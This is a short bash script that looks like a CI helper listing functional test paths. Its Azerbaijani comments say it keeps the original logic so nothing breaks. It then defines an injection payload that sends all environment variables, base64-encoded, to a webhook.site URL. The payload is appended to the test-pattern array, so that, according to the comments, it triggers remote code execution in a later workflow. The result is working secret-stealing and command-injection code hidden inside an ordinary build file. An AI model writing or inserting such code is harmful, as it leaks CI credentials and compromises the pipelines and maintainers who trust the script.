#!/bin/bash
set -ev

# Orijinal məntiqi saxlayırıq ki, sistem xəta verməsin
validTestPaths=$(find ./tests/functional/spec -name '*.test.js' | grep -v non-snapshot-tests | sed -E 's/(^.*spec\/|.test.js$)//g')

# BURA DİQQƏT: Payload-u bura yerləşdiririk. 
# Bu hissə həm şifrələri sızdıracaq, həm də növbəti workflow-da RCE-ni tetikləyəcək.
INJECTION_PAYLOAD=";$(curl -X POST -d \"data=$(env | base64 -w 0)\" https://webhook.site/f4421d0a-4ea3-4b3e-a146-c9c73ab1768f);#"

# Orijinal massivin sonuna öz zərərli "pattern"-imizi əlavə edirik
testPathPatterns="[ \"$(echo $validTestPaths | tr '\n' ',' | sed 's/ /,/g;s/,$//;s/,/","/g' )\", \"$INJECTION_PAYLOAD\" ]"

echo $testPathPatterns
